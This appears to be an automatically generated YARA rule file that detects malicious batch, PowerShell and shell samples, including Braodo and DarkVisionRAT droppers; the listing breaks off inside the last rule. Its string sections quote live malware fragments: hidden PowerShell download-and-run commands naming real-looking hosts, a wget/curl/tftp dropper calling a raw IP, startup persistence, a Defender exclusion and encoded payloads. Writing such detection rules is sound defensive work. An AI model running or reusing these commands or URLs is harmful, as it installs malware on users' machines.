rule b5a56531cc09d530023f70bb502855356bb4d472f46f69c9fc7162c1cb0522d9_b5a56531 {
   meta:
      description = "_subset_batch - file b5a56531cc09d530023f70bb502855356bb4d472f46f69c9fc7162c1cb0522d9_b5a56531.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b5a56531cc09d530023f70bb502855356bb4d472f46f69c9fc7162c1cb0522d9"
   strings:
      $x1 = "powershell -WindowStyle Hidden -Command \"& {$url='https://www.alwahaschools.edu.eg/nord-vpn.alwahaschools.edu.eg/nomousy.zip';$" ascii /* score: '43.00'*/
      $x2 = "powershell -WindowStyle Hidden -Command \"& {$url='https://www.alwahaschools.edu.eg/nord-vpn.alwahaschools.edu.eg/nomousy.zip';$" ascii /* score: '31.00'*/
      $s3 = "ownloadPath='%temp%\\nomousy.zip';$extractPath='%temp%\\nomousy';New-Item -ItemType Directory -Path $extractPath -Force | Out-Nu" ascii /* score: '22.00'*/
      $s4 = "Path = Get-ChildItem -Path $extractPath -Name 'nomousy.exe' -Recurse | Select-Object -First 1;if ($exePath) {$fullPath = Join-Pa" ascii /* score: '20.00'*/
      $s5 = "th $extractPath $exePath;& $fullPath /hide};Remove-Item $downloadPath -Force}\"" fullword ascii /* score: '14.00'*/
      $s6 = ";Invoke-WebRequest -Uri $url -OutFile $downloadPath;Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force;$exe" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule bc99562c4775d6b5f7e18ab4a5dd207ae036f039296f49a889d58124a6135e7e_bc99562c {
   meta:
      description = "_subset_batch - file bc99562c4775d6b5f7e18ab4a5dd207ae036f039296f49a889d58124a6135e7e_bc99562c.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bc99562c4775d6b5f7e18ab4a5dd207ae036f039296f49a889d58124a6135e7e"
   strings:
      $x1 = "powershell -noprofile -command \"Invoke-WebRequest '%base%/far.bat' -OutFile '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Program" ascii /* score: '43.00'*/
      $x2 = "powershell -noprofile -command \"Invoke-WebRequest '%base%/far.bat' -OutFile '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Program" ascii /* score: '43.00'*/
      $x3 = "powershell -noprofile -command \"Invoke-WebRequest '%base%/va.tar' -OutFile '%d%\\va.tar'\"" fullword ascii /* score: '35.00'*/
      $x4 = "    powershell -noprofile -command \"Invoke-WebRequest '%base%/a.txt' -OutFile '%d%\\result.txt'\"" fullword ascii /* score: '34.00'*/
      $x5 = "    powershell -noprofile -command \"Invoke-WebRequest '%base%/b.txt' -OutFile '%d%\\result.txt'\"" fullword ascii /* score: '34.00'*/
      $s6 = "    powershell -WindowStyle Hidden -Command \"Start-Process -FilePath '%~f0' -ArgumentList 'h' -WindowStyle Hidden\"" fullword ascii /* score: '28.00'*/
      $s7 = "python.exe loa.py -i ui.bin -k a.txt" fullword ascii /* score: '25.00'*/
      $s8 = "set base=https://democracy-answering-custom-acid.trycloudflare.com" fullword ascii /* score: '21.00'*/
      $s9 = "cd /d \"%d%\\txa\"" fullword ascii /* score: '16.00'*/
      $s10 = "tar -xf \"%d%\\va.tar\" -C \"%d%\\txa\"" fullword ascii /* score: '15.00'*/
      $s11 = "set d=%LOCALAPPDATA%\\Packages" fullword ascii /* score: '14.00'*/
      $s12 = "rtup\\startup.bat'\"" fullword ascii /* score: '11.00'*/
      $s13 = "mkdir \"%d%\\txa\"" fullword ascii /* score: '11.00'*/
      $s14 = "if %errorlevel%==0 (" fullword ascii /* score: '11.00'*/
      $s15 = "rem Download files" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3KB and
      1 of ($x*) and all of them
}

rule bd2d594bd5b3ba81beb938bef3679cd89e95e1f1d7f08e5fdd4daf6a6e9ea802_bd2d594b {
   meta:
      description = "_subset_batch - file bd2d594bd5b3ba81beb938bef3679cd89e95e1f1d7f08e5fdd4daf6a6e9ea802_bd2d594b.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd2d594bd5b3ba81beb938bef3679cd89e95e1f1d7f08e5fdd4daf6a6e9ea802"
   strings:
      $x1 = "=powershell -Command \"Start-Process powershell -WindowStyle Hidden -Argu" fullword ascii /* score: '33.00'*/
      $s2 = "=coding]::Unicode.GetString^([system.convert]::Frombase64string^($sofigo.repl" fullword ascii /* score: '16.00'*/
      $s3 = "=mentList '-Command \\\"$sofigo = ''IAAgACAAWwBOAGUAdAAuAFMAZQBy" fullword ascii /* score: '12.00'*/
      $s4 = "=ZABlAHgATwBmACgAJABlAG4AZABGAGwAYQBnACkAOwAgACAAIAAkAGUAbgBkAEkAbgBkAGUAeAAgAD0AIAA" fullword ascii /* base64 encoded string 'd e x O f ( $ e n d F l a g ) ;       $ e n d I n d e x   =   ' */ /* score: '10.00'*/
      $s5 = "=YQAoACQAbABpAG4AawApACAAfQAgAGMAYQB0AGMAaAAgAHsAIABjAG8AbgB0AGkAbgB1AGUAIAB9ACAA" fullword ascii /* base64 encoded string 'a ( $ l i n k )   }   c a t c h   {   c o n t i n u e   }   ' */ /* score: '10.00'*/
      $s6 = "=ACAAJABpAG0AYQBnAGUAVABlAHgAdAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABzAHQAYQByAHQASQB" fullword ascii /* base64 encoded string '   $ i m a g e T e x t . S u b s t r i n g ( $ s t a r t I ' */ /* score: '10.00'*/
      $s7 = "=ace^(''d@'',''c''^)^)^);iex $OWjuxD\\\"'\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule Braodo_signature_ {
   meta:
      description = "_subset_batch - file Braodo(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed5ba36767d3609589d726f4be196518510c0035e02cdb6f5a51a66027acbebd"
   strings:
      $x1 = "echo kdmyxvyojahwjqoddzuiwdidywlhurvssnauhdyplotymuoszxnzccubpchbmtpptaualitldfgbbdwnhgcsazcaezhdtullvkqiripxlvugvsvgscwmpzuxuem" ascii /* score: '66.00'*/
      $x2 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://tinyurl.com/mh1-pd-9625' -OutFile '%" ascii /* score: '55.00'*/
      $x3 = "EMP%\\rpd-9625.bat'; Start-Process -FilePath '%TEMP%\\rpd-9625.bat' -WindowStyle Hidden\"" fullword ascii /* score: '41.00'*/
      $x4 = "    powershell -WindowStyle Hidden -Command \"Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs\"" fullword ascii /* score: '40.00'*/
      $x5 = "start /min cmd /c \"powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://tinyurl.com/mh1-pd-9625' -OutFile '%" ascii /* score: '39.00'*/
      $s6 = "kpfejehxntempbmhtneqdxjzbevniotjnxikapciidaxjlwnvfsprfccbrjmvzthiophcrklnsqjlxhoihuuceyeiashhbbbilywazcnhvdjmkbnrpxulvwaxucuoixd" ascii /* score: '20.00'*/
      $s7 = "rivmhywhbazqeyezgetpmjpafoadphdsxmewcoyqgefnhkqgxwhszgxuihadnmjhxntgznwizawtqlrnaylhwbcrbfuqkvyigjwpayjpyjnzulntmlftjsbtnnzbmuqt" ascii /* score: '18.00'*/
      $s8 = "zuyieqafajnceumkyzbkegjekkxqkvjdllnsydpbkhtmzvwtmhbagvircoqrarovbfszayngzfwheixvipsxrsrrrcqjolwesoajmzjxrxjjdpxsufsxhvyrqsivoyjg" ascii /* score: '18.00'*/
      $s9 = "myeewymhiituswqojeznjmcxinfpjbjllkyiwzxewxhgyfuevjlpiltefaohruchsdkknoeveyeexyqdmyvvdrjmskdkwzircsepwhdfvkoghsongleahlpsweztytbz" ascii /* score: '18.00'*/
      $s10 = "eyedllcjpuwyqluhgfprrilnnizkuhnplmikuqragsoncbenvkghxilrrmwliddmdprpumztstkyqpwbfwrfnwninnsgjkwzmputhueqticrgvvjzgxmyvfbelnyskoc" ascii /* score: '18.00'*/
      $s11 = "ehcsukbgozkkejzlbpulmihpmvnfimnheavnfcsvknmbgatfaekwoosyzuwcfrdcrvqrtzfmrzgsqdumpxysqrrrmwvxxpyrhqukuhmngakpjajbheeuaxitjyqgxtyf" ascii /* score: '18.00'*/
      $s12 = "keyewvwtjbgiykhmpijwswftnzwoixnsdrchrvqldqkyekexynedfojejfogyrbadoxgtixnecmzqbnmgnfflpfycmbxpwddudvfgfjgsrbsvznmpsbamvamudrbzkgb" ascii /* score: '16.00'*/
      $s13 = "ecredmlbivbyrrgujokpklstdjroikjrfjrhhykeydudzqgpsgcswnmugvechhomdmfcvbvofvaaekftpqxxeinmxaystthkeajdomtnaaxmnlimmoglkwhbugdzqjxw" ascii /* score: '16.00'*/
      $s14 = "dxyzexkstvbqqdikdsbcqeyocteicomobttwhjeupjuclwuhjkkyrctbwnzxfruzcscmxbjyccydijkjikvesyivhtteyqubcbpkbpypxrmynepijweyemokqxhzdtzn" ascii /* score: '16.00'*/
      $s15 = "qqfmuqhdtocgputamwqwbdzajcezudtofsotjhuiwyqwbsljoplogdkeylmtolpbzwnlhvgbizuaynzrduzwzorqubznxmtpzflgrxbiisxgfwazfahzepyjkjrxhyrm" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule Braodo_signature__bbfa8e1a {
   meta:
      description = "_subset_batch - file Braodo(signature)_bbfa8e1a.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bbfa8e1a2d774fc07b78dfa97f5f67c156be222d64bb895cbce9a4ad6b22f46a"
   strings:
      $x1 = "orysljnmvvhygqtcfqfyphptxkwzsmlbcschrnboryysvvsoxyernchdypothphmsojriwljoojindmvusukbmualdfznlsgwbsiuvfdlgwexenlzsubufyydgophohe" ascii /* score: '66.00'*/
      $s2 = "%VAR0:~2,1%%VAR0:~2,1%%VAR0:~2,1%%VAR0:~2,1%%VAR0:~40,1%%VAR0:~62,1%%VAR0:~15,1%%VAR0:~4,1%%VAR0:~42,1%%VAR0:~41,1%%VAR0:~38,1%%" ascii /* score: '23.00'*/
      $s3 = "ist elevated -Verb RunAs\"" fullword ascii /* score: '23.00'*/
      $s4 = "lzuxxwbkwxthvvasienbupuqccjjiwlmrvzdjxkqyskbpzhryglsvtempmbemiulosexcdcveyenrfdquzokxsaxzuyfwhaycvgkjoicfoovkeqzegfgvqlzcbqjiirq" ascii /* score: '20.00'*/
      $s5 = "elohxthostulwbctpfbxxwxkxzuigscwglgrewnholaaiyqjisqujftpzwfgtkxwesfrwtyjoklrsxujyhyzgeitauozpuouxxcuuenomondmkggricllodmvsyusoyo" ascii /* score: '18.00'*/
      $s6 = "nchgrywijnvjmjhomtizndumpvzqkmfizysgqcrwfvzsshotjiheijdvhnewiipsqwzzsewubfljodhnpafpkrmzzvrqrhrcwcdtawgyfzfhiifmernkfpgxaoayupvo" ascii /* score: '18.00'*/
      $s7 = "rueaqxogjrepomafskctisyvbetqglibfmlrvvjpsxgklligsighymgpozqqgkzhhvlzrhmsmxwaikrzlnsomeedvubhtbftpakmsxirmvlvunpeacoubrungrjocikz" ascii /* score: '16.00'*/
      $s8 = "tbxctdfgxcgzhijwdydmmepzzcdakfvpdnsfmwknrunodkrzadvwbbzxzyvniuwivihftpdneyfmzmygctfxzrkjvirnkjwfncmalhgpnpzffxnwextcgrujfskarwjw" ascii /* score: '16.00'*/
      $s9 = "fhdjalcxcpdgzblamvkqxgufiniznhhnxhzmgetkjnmvixkzoruyzxtcbakwnrrbinxvumevrjehubtgzichmggbnkpneggsqbxjmcdlfxawrmrafufnqdvvxpivfwho" ascii /* score: '16.00'*/
      $s10 = "cmdjpgwzywfwnuqhyidxshkzjrxsgxlyjkugvlotyjdiazfhmkdiypnkzydskgfqcuqmcqldedzgqucsulvenxxsinehyrqgojmbqdllegiilejeicqconpdrdaeeytd" ascii /* score: '16.00'*/
      $s11 = "kqitodkmkyyafwwahlmqufizjqctwptsedkcwtvycrpmjtyshijduyxdxzcmdwwfcpynbtxjicmbnutqzixkivhdgthpixqktfkkcqhaqzaihdqdrsvdjqadllfmwyax" ascii /* score: '16.00'*/
      $s12 = "uguwrollxpueqcinueuzyzoxtlyrsefllzsvhkldnvxvsolprmefudmrylgtakswkfnefxtgqnwvzgbnqoluhlcpjcbwozrejyivnhopiwfhwjqxtexecmiurhwqkmcu" ascii /* score: '16.00'*/
      $s13 = "rauyxxkhicwhehxbufyakmingqhzcollubsqqiaxtdfvdegvwzlnbnkizvefhrstfhyvlgpjoaagfjlgxzttwbumwcquoxjtlqyjrgmsaljqzbingmspyaxradumznac" ascii /* score: '16.00'*/
      $s14 = "xvvarmarkhwvbdjicribhdtaamvjgtdzgstudlymnuqjprszdvflpshgraqbnvomnkyifvoufmunjoecfwfdlmdeylcnsxqexeczifhhptaflfauskiuhvfminnlxogl" ascii /* score: '16.00'*/
      $s15 = "baptxdspyzukymwspvyyypzrvqvlxyvgtnfpwytyqmavvpcxbvnkkktnewpgayofucjkvkkuzjmhwrrkpohompgqljthantzteverpxzapiyoqbbndunmtmpmkqpjadf" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x726f and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule c58cd630a3670accc25a831aa75066bd4ccdf8227f19c96963a30e4a909d969f_c58cd630 {
   meta:
      description = "_subset_batch - file c58cd630a3670accc25a831aa75066bd4ccdf8227f19c96963a30e4a909d969f_c58cd630.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c58cd630a3670accc25a831aa75066bd4ccdf8227f19c96963a30e4a909d969f"
   strings:
      $x1 = ":: 6AHmCQAB5gkA0RVSaVOxZHbqGl1aP2pTF5z9ZD0ORHhTXRnYZpUAT3UAAAAAixaxNWH3s0SCYF4wILvThPd52S5xejb7CyxsBAL5RZrr87eyqK1qEzROUWZkz3SCn" ascii /* score: '68.00'*/
      $s2 = "0QuGNcDN9ojR7eZjOCMwYAyLLDvq9xtdbVRiRPAd8ZRRLj+6yyUnzC3foslgJ6U9zx3J3uvPmfw0H+Jhh0pul8U68KISB33KSnW2BxSDp+8Exec2O0zyaureZDbCKpnI" ascii /* score: '23.00'*/
      $s3 = "F2gaQemAxObrqaer+vcBTfwn2ERBD50RSjAfinXp0CFgufpMH5idxJH7ZXYcKnPIpe5qV6H2gVq87Cy02c72mC3FVCHvivQfxfiDxS408NiM/4L0+Lq9PjSt37dGVwZs" ascii /* score: '22.00'*/
      $s4 = "aWsu+R9CEQZMUmDN6m8JXm/PyReKyBFK7P5a/ixNfExeCG1A4ofL4xPfAgBO8dnKeOoqlpUskzRugoYm0dBQbR7pTeas+u90PdObtDR4b8w24SSjsJzgptiApawni4L9" ascii /* score: '22.00'*/
      $s5 = "pt/WjycxDlLNW59+3i4RSVS9eiE7TRC5g7lYlSd2EAj8N1mxKXxR4zSm/r+lFzGQMr/eD63O/IH64PT2FdkuvKOKPZbvfTP1YFqEubI4UrcxMv6KxlnHnFVcWm2Vx3b4" ascii /* score: '21.00'*/
      $s6 = "tbPmSIEGdOazjGEvVtWAgYHzAmQs0DKZxrZVLthjhxVX/xl12CVL4H7mylPGYTbKhfSthy6/MvLlogfWs5sUPuC3a+przwywhHdyAM6AV6cTL/h63zC76n1An8sa9w2n" ascii /* score: '21.00'*/
      $s7 = "XJ4bVUKScB0TplusceGmsPy9NodthwNnim7TumxUjB1FwB72l/5jXCLzx8I1QbDawXyRAnced0IRcgX1NYMot92aPh6r4/ABvDGVcxlM7DgjRYvCtAzjW/swBS+AdnXM" ascii /* score: '21.00'*/
      $s8 = "RfPEareHOJZ5eikb7ZoQE1NJuOaq5j3+P2kMb839z13ccJWG7bp9fpGUBrWcSzXEOsRrHRG0HNIiPARFlwlayPtvf9XdIOsUrnK0Nz7tmH6RheHOOTmYFIa8cOMZ2irc" ascii /* score: '19.00'*/
      $s9 = "stMn7tgcQ+uxVm8k8CnYmbjIeXzSYYE0A/4GLXDRST4n0CJhVMGgiDXoJSLNx8TOIYN6bfIGOk+rSkPDK8lWgYBYt/5TG1fVEXEcZgB6/lcFLd8Drcr9FAs8HZ/4TKVD" ascii /* score: '19.00'*/
      $s10 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%oYsjuewr% %MuzppFgM%%temp%%MokQwW" ascii /* score: '18.00'*/
      $s11 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dLYOHFAc%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s12 = "T6rnRA0HS3gVn1cqzmv6OJFms19DRuNMBs8otdZAcHwmd19EhbeMIcs0N5mvr1VT0K6vuYRuFQybDyF3vspvYUklUwL/eDRVjudgI9L/OJD1Nyv2d8DldHixbOHBQzGW" ascii /* score: '18.00'*/
      $s13 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%WEuyogNS%%dAntIrqL%%HybCcosk% %sdqZxwXd% %LdpHInNi%%gfsnVBmS%%wpspSvzN% %MuzppFgM%%te" ascii /* score: '18.00'*/
      $s14 = "%sdqZxwXd% %RpByHLqb%%wpspSvzN% %appdata%%QcUSmMXT%%BtXbxdlC%%lLXXlive%%rTSsZVfK%%MbJRvvgh%%XAsJmGpQ% %xqQdzOiS%%QwMoNKst% %uyMs" ascii /* score: '18.00'*/
      $s15 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%UQLDkhNg%%JbDzTdOk%%MuzppFgM% %sdqZxwXd% %ObbPWxrc%%nnaqyDMS% %MuzppFgM%%te" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule d99d881242009bf571e239221c32d97bef1b3142c817a2ee394d03cf125d1234_d99d8812 {
   meta:
      description = "_subset_batch - file d99d881242009bf571e239221c32d97bef1b3142c817a2ee394d03cf125d1234_d99d8812.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d99d881242009bf571e239221c32d97bef1b3142c817a2ee394d03cf125d1234"
   strings:
      $x1 = "powershell -WindowStyle Hidden -Command \"Start-Process -FilePath '%ds%' -WindowStyle Hidden\"" fullword ascii /* score: '37.00'*/
      $s2 = "powershell -WindowStyle Hidden -Command ^" fullword ascii /* score: '25.00'*/
      $s3 = "powershell -Command \"Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Installi" ascii /* score: '24.00'*/
      $s4 = "powershell -Command \"Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Installi" ascii /* score: '24.00'*/
      $s5 = "hAHQAYQBcAHMAZQByAHYAaQBjAGUALgBwAHMAMQAiACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBjAGgAZQBhAHQAeAAuAHYAZQByAGMAZQBsAC4AYQBwAHAALwB" ascii /* base64 encoded string ' t a \ s e r v i c e . p s 1 "   - U r i   h t t p s : / / c h e a t x . v e r c e l . a p p / ' */ /* score: '17.00'*/
      $s6 = "BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AEEAcABwAEQAYQB0AGEAIgAgAC0AVgB" ascii /* base64 encoded string ' d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   $ e n v : A p p D a t a "   - V ' */ /* score: '17.00'*/
      $s7 = "powershell -w h -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgB" ascii /* score: '13.00'*/
      $s8 = "powershell -w h -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgB" ascii /* score: '13.00'*/
      $s9 = "set \"ds=%~dp0updater.exe\"" fullword ascii /* score: '11.00'*/
      $s10 = "set \"url=https://cheatx.vercel.app/volcano/updater.exe\"" fullword ascii /* score: '10.00'*/
      $s11 = "cd /d \"%~dp0\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 3KB and
      1 of ($x*) and all of them
}

rule DarkVisionRAT_signature_ {
   meta:
      description = "_subset_batch - file DarkVisionRAT(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ab9cfb220debabf3b0789611d45cd86104f9b0b8d941fca0689b6c11ae26fc45"
   strings:
      $x1 = "SET NGHGFDGUND=powershell -Command \"Start-Process powershell -WindowStyle Hidden -" fullword ascii /* score: '33.00'*/
      $s2 = "SET FIFINGGGSJ=xd = [system.Text.encoding]::Unicode.GetString^([system.convert]::Frombase64string^(" fullword ascii /* score: '16.00'*/
      $s3 = "SET JDSJOHJFOI=ArgumentList '-Command \\\"$ddsdgo = ''IAAgACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUA" fullword ascii /* score: '12.00'*/
      $s4 = "KIKNDFI%%NNNOHDGGDU%%FJIOUOIUOF%%DNFJGDGFII%%NJJFJSFUII%%IIDUSDNINF%%DDNGOJUDOK%%GSOJUHIOJD%%GSIKIUHJNO%%FGIDDOOOFN%%OUIDOSFDOG%" ascii /* score: '8.00'*/
      $s5 = "%OOOGDNFDNN%%HSNDGDDSFD%%IOFIFNOUKG%%IOFOGFGGSO%%IGODDKDNGO%%NJOFODSIFG%%SOOKGIOGNH%%SSNDDOJSDD%%HNSDNNGODU%%GJDNGNFNIG%%JIGNSNI" ascii /* score: '8.00'*/
      $s6 = "%JOOUDGGUGS%%GSHGFDDGFN%%GDJDNDGJDD%%ODOJNGSJDJ%%OGNIODNUJG%%JODIGNGDJG%%OGNNIDHJON%%IJONSOGKJO%%JDDJJNOGSD%%INOJFGFGDI%%JDDJFFD" ascii /* score: '8.00'*/
      $s7 = "NDF%%DKFSJJSDGG%%SONDDGFJNF%%GINKIFOOGF%%FJJINFSOIJ%%SGGFIUDJJS%%SDKOOGUJGS%%JSIJDNDODK%%FOGIINODGS%%IGUIONGGDI%%ONOOGUGFGU%%IOK" ascii /* score: '8.00'*/
      $s8 = "%NGHGFDGUND%%JDSJOHJFOI%%KIFSOOJKFD%%IDIDSNONGH%%ISIDUINDNN%%IHDDGGDIIN%%FGGIDNOIJI%%DIGGOFGGGI%%IJJDSDDFDO%%SOINNNODOD%%GJODFNO" ascii /* score: '8.00'*/
      $s9 = "%NGHGFDGUND%%JDSJOHJFOI%%KIFSOOJKFD%%IDIDSNONGH%%ISIDUINDNN%%IHDDGGDIIN%%FGGIDNOIJI%%DIGGOFGGGI%%IJJDSDDFDO%%SOINNNODOD%%GJODFNO" ascii /* score: '8.00'*/
      $s10 = "DFF%%NGFJFFGDIF%%NKGJIIDKGF%%GDNGDGJOGF%%ISIDOOGUOK%%JNFDNFJNGD%%FDNIGGSNFG%%SSOIFOGNDG%%GGJGDJGOGO%%FKDSGGIHFI%%OGGKDJGSIF%%IJF" ascii /* score: '8.00'*/
      $s11 = "SET FKDGHDGNGN=$ddsdgo.replace^(''d@'',''c''^)^)^);iex $OWjuxD\\\"'\"" fullword ascii /* score: '8.00'*/
      $s12 = "FIDDNDS%%DGNSOIGIFD%%GDNJJUGIIN%%OHKIFSDKNN%%NGFOGUNIHD%%GUKHDOKFJJ%%ONDGSGHIHK%%ODFDHGHUFI%%SOUGDOGFOJ%%GOGISSNSOI%%NFJDIOIIGG%" ascii /* score: '8.00'*/
      $s13 = "JKF%%FIFINGGGSJ%%FKDGHDGNGN%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6540 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule b5ae08ae1bf0761629e75d2b0ef011b4519d4bfb3d99973da019ffe8bc673089_b5ae08ae {
   meta:
      description = "_subset_batch - file b5ae08ae1bf0761629e75d2b0ef011b4519d4bfb3d99973da019ffe8bc673089_b5ae08ae.ace"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b5ae08ae1bf0761629e75d2b0ef011b4519d4bfb3d99973da019ffe8bc673089"
   strings:
      $s1 = "PO4500564358.exe" fullword ascii /* score: '19.00'*/
      $s2 = "4500564358" ascii /* score: '17.00'*/ /* hex encoded string 'EVCX' */
   condition:
      uint16(0) == 0x297c and filesize < 2000KB and
      all of them
}

rule b6c984a150f16871814b0c2fcd6c5566282de3b25e0d1a1540c8876e8fb15e6f_b6c984a1 {
   meta:
      description = "_subset_batch - file b6c984a150f16871814b0c2fcd6c5566282de3b25e0d1a1540c8876e8fb15e6f_b6c984a1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b6c984a150f16871814b0c2fcd6c5566282de3b25e0d1a1540c8876e8fb15e6f"
   strings:
      $x1 = "  (wget http://109.205.213.5/kvariant.$arch -O /tmp/$arch || curl -o /tmp/$arch http://109.205.213.5/kvariant.$arch || tftp -g -" ascii /* score: '35.00'*/
      $s2 = "  (wget http://109.205.213.5/kvariant.$arch -O /tmp/$arch || curl -o /tmp/$arch http://109.205.213.5/kvariant.$arch || tftp -g -" ascii /* score: '28.00'*/
      $s3 = "r kvariant.$arch 109.205.213.5) && chmod +x /tmp/$arch && /tmp/$arch tbk.exploit && rm /tmp/$arch" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6f66 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule b6fe52fd8f9a4ceff192b8c45ad123710cbfe33c4e0af4c860f8bb355a48c795_b6fe52fd {
   meta:
      description = "_subset_batch - file b6fe52fd8f9a4ceff192b8c45ad123710cbfe33c4e0af4c860f8bb355a48c795_b6fe52fd.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b6fe52fd8f9a4ceff192b8c45ad123710cbfe33c4e0af4c860f8bb355a48c795"
   strings:
      $s1 = "%REVISED_OFFER.bat" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10KB and
      all of them
}

rule b72bf5446c7020da5ef9e776b6109d592da1ea6361b8c44cf0d3ee42dc52f581_b72bf544 {
   meta:
      description = "_subset_batch - file b72bf5446c7020da5ef9e776b6109d592da1ea6361b8c44cf0d3ee42dc52f581_b72bf544.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b72bf5446c7020da5ef9e776b6109d592da1ea6361b8c44cf0d3ee42dc52f581"
   strings:
      $x1 = "$encryptedPayload = '1E0l0UIRObVSFT8ntM90nBmLFJXbB+KEfkiBnylwvQjFpnd+73G1tsa0d+Rw9Nz2uxBBcluB7eHO8cKO+ShkhAZgQnPrsaK3BaXgtaKbAiv" ascii /* score: '67.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "W8RBLq7AiRC3ZI/xY20Ctly60tRYxYsUJ1Z/jHWPACadLLf/nGuHaK9+z6L1ZJhn2BkGi9SjD1idvyvJu7NWTGu3HhrmbaKHo4YfWzdu3T2kx0Mv6dadumpFc7sVaI6m" ascii /* score: '27.00'*/
      $s4 = "5E6M0CmtqKng6SPsjvRxdumPRlGtqf4OK/R3KPkXvkF6oPN8iD+TwB9ZKiT6lwYA6yjylMmEftPpDRA2eH0infRhRzctBuiILI4wJcuH5vg58KfqJOv7BGQzgJJYtEvG" ascii /* score: '26.00'*/
      $s5 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s6 = "ED9jahjaF5/7pqdcUCibDGdmyZlXJYIPipEhp6JJvvcCXzIdDllJ1nQ/9BSW7mhBR+F/c9oAbBgPuEp6Dlh3hfYJj1JEXqVwTM58Vf/Ao1PLwhNuRn9xp4Zh/ZqDOTit" ascii /* score: '22.00'*/
      $s7 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s8 = "8NVTeYmpYOTBgQZqgML9iIIIuF7ZyoAaEfiH8bQ11N5d8G+xqfhKkLoGD5wsVb4m67tnnflGoNitQWwhmUot+Qy1A8ungePX253sZNUZVV/wAu+P3mhqSy/N+WMD5ftp" ascii /* score: '21.00'*/
      $s9 = "/LFjixSQRXIjKAQ9Ij3H6SOScZjGmmx+QB0nc4DFLp85Q2/DVDllmH9tzGs0thrIdTMU3HSCGn+vMumNFZ6u8piO6qjusk0Hy1laHNSOKxZ6sPyhgZsLvjpU3i+zBEg1" ascii /* score: '21.00'*/
      $s10 = "I5jcCB+ClGg6by9QJaukmuwJ4tA4MlAPXdw1q9glOgRFjD/unC1N8VyOrVX37ty5LkjHGxZaEGUfXosTr5ThIpMnLe3oAKy6Z8iU3rdLl8EpUWofL0Ud4Ld9Ni6EvlaA" ascii /* score: '21.00'*/
      $s11 = "NRlsuA51ci9JcCN1B7/bHgYTOKsM5mY9u9XLZe/zrffDojgG4d4cF2Xbyj0K1Q9dMKixDllBwpcw/hLog+7h5wPZiehzqMv/QWts3ASCzezX5rz75LM1tf6qo+8N/WV9" ascii /* score: '21.00'*/
